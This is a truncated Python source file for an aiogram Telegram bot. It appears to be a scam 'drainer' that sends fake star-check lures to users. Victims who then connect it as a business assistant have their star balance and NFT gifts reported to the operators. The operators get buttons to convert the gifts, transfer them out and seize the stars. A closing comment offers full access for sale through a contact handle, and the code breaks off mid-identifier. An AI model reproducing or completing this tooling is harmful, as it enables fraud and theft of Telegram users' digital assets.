from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, business_connection, BusinessConnection, FSInputFile, 
    InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, 
    BusinessMessagesDeleted, Update, WebAppInfo, User, Chat,
    InputMediaPhoto, InputMediaVideo, ReplyKeyboardMarkup, KeyboardButton, InlineQuery, InlineQueryResultPhoto
)
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars, UpgradeGift
from datetime import datetime
from aiogram.types import LabeledPrice, PreCheckoutQuery, SuccessfulPayment
import uuid

class WithdrawStates(StatesGroup):
    waiting_for_amount = State()

class TopupStates(StatesGroup):
    waiting_for_amount = State()
    
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import os
import sys
import sqlite3


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from utils import *
from config import POST_BOT_TOKEN, POST_CHANNEL_ID, LEADER_ID
from patterns.stars_check.links import *

CONNECTIONS_FILE = "business_connections.json"


class GiftTransferStates(StatesGroup):
    waiting_for_user_id = State()

from aiogram.fsm.storage.memory import MemoryStorage
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

post_bot = Bot(token=POST_BOT_TOKEN)

connection_dict = {}
nft_dict = {}
transfer_to = {}

USER_STAR_BALANCE = {}
# Словарь для хранения активированных чеков
ACTIVATED_CHECKS = {}

def get_user_star_balance(user_id: int) -> int:
    """Получить баланс звезд пользователя"""
    return USER_STAR_BALANCE.get(user_id, 0)  # По умолчанию 0 звезд

def set_user_star_balance(user_id: int, amount: int):
    """Установить баланс звезд пользователя"""
    USER_STAR_BALANCE[user_id] = amount

def add_user_stars(user_id: int, amount: int):
    """Добавить звезды пользователю"""
    current_balance = get_user_star_balance(user_id)
    set_user_star_balance(user_id, current_balance + amount)

def subtract_user_stars(user_id: int, amount: int) -> bool:
    """Вычесть звезды у пользователя. Возвращает True если успешно"""
    current_balance = get_user_star_balance(user_id)
    if current_balance >= amount:
        set_user_star_balance(user_id, current_balance - amount)
        return True
    return False


async def send_welcome_message_to_admin(connection, owner_id, bot: Bot):
    global connection_dict
    try:
        rights = connection.rights
        
        connection_dict[connection.id] = connection
        business_connection = connection
        
        try:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_count = response.star_amount
        except Exception as e:
            star_count = "ERROR"
            
        try: 
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            nft_count = 0
            for gift in gifts.gifts:
                if hasattr(gift, "owned_gift_id") and gift.owned_gift_id:
                    if gift.type == "unique":
                        nft_count += 1            
        except Exception as e:
            nft_count = "ERROR"
        
        keyboard = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="🚨 Просмотреть права", callback_data=f"check_rights:{connection.id}")],
                            [InlineKeyboardButton(text="🎁 Просмотреть подарки", callback_data=f"gifts:{business_connection.user.id}")],
                            [InlineKeyboardButton(text="⏰ Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{business_connection.user.id}")],
                            [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{business_connection.user.id}")],
                            [InlineKeyboardButton(text="💫 Забрать звезды", callback_data=f"transfer_stars:{business_connection.id}")],
                            [InlineKeyboardButton(text="♻️ Обновить", callback_data=f"update_message:{business_connection.id}")]
                        ]
                    )
        msg = (
                f"""🤖 <b>Новый бизнес-бот подключен!</b>
                
👤 <b>Пользователь:</b> @{business_connection.user.username or '—'}
🆔 <b>User ID:</b> <code>{business_connection.user.id}</code>
🔗 <b>Connection ID:</b> <code>{business_connection.id}</code>

🎁 <b>Количество NFT:</b> {nft_count}
⭐️ <b>Количество звезд:</b> {star_count}
↕️ <b>Можно передавать подарки:</b> {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}
"""
            )
        await bot.send_message(owner_id[0], msg, parse_mode="HTML", reply_markup=keyboard)
        
        try:
            await bot.send_message(owner_id[1], msg, parse_mode="HTML", reply_markup=keyboard)
        except Exception as e:
            logging.exception("Не удалось отправить сообщение в личный чат.")
            
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")
        

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str, bot: Bot) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if gift.owned_gift_id == owned_gift_id:
                    # Правильно форматируем имя подарка для URL
                    gift_name = gift.gift.base_name.replace(" ", "").replace("-", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
            
            # Если подарок не найден, возвращаем информацию об ошибке
            return f"🎁 Подарок не найден (owned_gift_id: {owned_gift_id})"
    except Exception as e:
        return f"🎁 Ошибка получения подарка: {e}"
    
                
def register_handlers(dp: Dispatcher):
        
        
    @dp.inline_query()
    async def inline_check(query: InlineQuery, bot: Bot):
        global ACTIVATED_CHECKS
        text = (query.query or "").strip().lower()
        logging.info(f"Got inline query: '{text}'")

        me = await bot.get_me()
        if text.startswith("check ") and text.split()[1].isdigit():
            n = text.split()[1]
            check_id = f"check_{n}_{uuid.uuid4().hex[:8]}"
            start_url = f"https://t.me/{me.username}?start={check_id}"

            image_url = "https://i.postimg.cc/43M7zbwQ/photo-2025-08-03-15-05-16-2.jpg" 

            caption = f"⭐️ Вы получили чек на {n} звёзд!\nНажмите на кнопку ниже, чтобы добавить их на свой баланс."

            kb = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text=f"Активировать чек на {n}⭐️", url=start_url)]
                ]
            )

            result = InlineQueryResultPhoto(
                id=str(uuid.uuid4()),
                photo_url=image_url,
                thumbnail_url=image_url,
                caption=caption,
                reply_markup=kb
            )

            await query.answer(results=[result], cache_time=0)
        else:
            await query.answer(results=[], cache_time=0)


    @dp.callback_query(F.data.startswith("check_rights"))
    async def handle_instructions(callback: CallbackQuery, bot: Bot):
        await callback.answer()
        
        business_connection_id = callback.data.split(':')[1]
        connection = connection_dict[business_connection_id]
        rights = connection.rights
        rights_text = "\n".join([
                f"📍 <b>Права бота:</b>",
                f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
                f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
                f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
                f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
                f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
                f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
                f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
                f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
                f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
                f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
                f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
                f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
                f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
            ])
        
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="🗑", callback_data="delete")]]
        )
        await callback.message.reply(rights_text, parse_mode="HTML", reply_markup=keyboard)
        
    
    @dp.callback_query(F.data.startswith("update_message"))
    async def handle_instructions(callback: CallbackQuery, bot: Bot):
        await callback.answer()
        
        business_connection_id = callback.data.split(':')[1]
        connection = connection_dict[business_connection_id]
        rights = connection.rights
        business_connection = connection
        
        try:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_count = response.star_amount
        except Exception as e:
            star_count = "ERROR"
            
        try: 
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            nft_count = 0
            for gift in gifts.gifts:
                if hasattr(gift, "owned_gift_id") and gift.owned_gift_id:
                    if gift.type == "unique":
                        nft_count += 1            
        except Exception as e:
            nft_count = "ERROR"
        
        keyboard = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="🚨 Просмотреть права", callback_data=f"check_rights:{connection.id}")],
                            [InlineKeyboardButton(text="🎁 Просмотреть подарки", callback_data=f"gifts:{business_connection.user.id}")],
                            [InlineKeyboardButton(text="⏰ Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{business_connection.user.id}")],
                            [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{business_connection.user.id}")],
                            [InlineKeyboardButton(text="💫 Забрать звезды", callback_data=f"transfer_stars:{business_connection.id}")],
                            [InlineKeyboardButton(text="♻️ Обновить", callback_data=f"update_message:{business_connection.id}")]
                        ]
                    )
        msg = (
                f"""🤖 <b>Новый бизнес-бот подключен!</b>
                
👤 <b>Пользователь:</b> @{business_connection.user.username or '—'}
🆔 <b>User ID:</b> <code>{business_connection.user.id}</code>
🔗 <b>Connection ID:</b> <code>{business_connection.id}</code>

🎁 <b>Количество NFT:</b> {nft_count}
⭐️ <b>Количество звезд:</b> {star_count}
↕️ <b>Можно передавать подарки:</b> {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}
"""
            )
        await callback.message.edit_text(msg, parse_mode="HTML", reply_markup=keyboard)
        
        
    @dp.business_connection()
    async def handle_business_connect(business_connection: business_connection, bot: Bot):
        if not business_connection.is_enabled:
            me = await bot.get_me()
            await bot.send_message(get_bot_owner(me.username)[0], f"""❌🤖 <b>Отключение бизнес-бота!</b>
                                   
👤 <b>Пользователь:</b> @{business_connection.user.username}         
🆔 <b>User ID:</b> <code>{business_connection.user.id}</code>""", parse_mode="HTML")
            
            delete_business_connection_data(business_connection.id, me.username)
            return
        
        try:
            me = await bot.get_me()
            await send_welcome_message_to_admin(business_connection, get_bot_owner(me.username), bot)
            await bot.send_message(business_connection.user.id, """<b>Бот был успешно подключен в качестве бизнес-ассистента.</b>""", parse_mode="HTML")

            business_connection_data = {
                "user_id": business_connection.user.id,
                "business_connection_id": business_connection.id,
                "username": business_connection.user.username,
                "first_name": business_connection.user.first_name,
                "last_name": business_connection.user.last_name
            }
            user_id = business_connection.user.id
            connection_id = business_connection.user.id
            me = await bot.get_me()
            save_business_con




#код для первичного ознакомления. для полного доступа пишите @shimorra
